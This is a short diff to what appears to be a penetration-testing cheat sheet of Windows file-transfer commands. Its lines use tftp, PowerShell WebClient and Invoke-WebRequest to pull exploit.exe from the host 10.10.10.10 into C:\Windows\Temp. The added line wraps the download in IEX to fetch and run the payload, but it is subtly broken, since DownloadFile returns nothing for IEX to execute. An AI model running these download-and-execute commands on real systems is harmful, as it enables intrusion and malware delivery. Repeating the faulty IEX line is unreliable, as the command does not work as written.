@@ -17,6 +17,7 @@ tftp -i 192.160.1.101 GET wget.exe
 
 # Powershell (all versions)
 ((New-Object System.Net.WebClient).DownloadFile('http://10.10.10.10/exploit.exe','C:\Windows\Temp\app.exe'));
+IEX((New-Object System.Net.WebClient).DownloadFile('http://10.10.10.10/exploit.exe','C:\Windows\Temp\app.exe'));
 
 # Powershell 4 and 5
 Invoke-WebRequest "http://10.10.10.10/exploit.exe" -OutFile "C:\Windows\Temp\app.exe"  
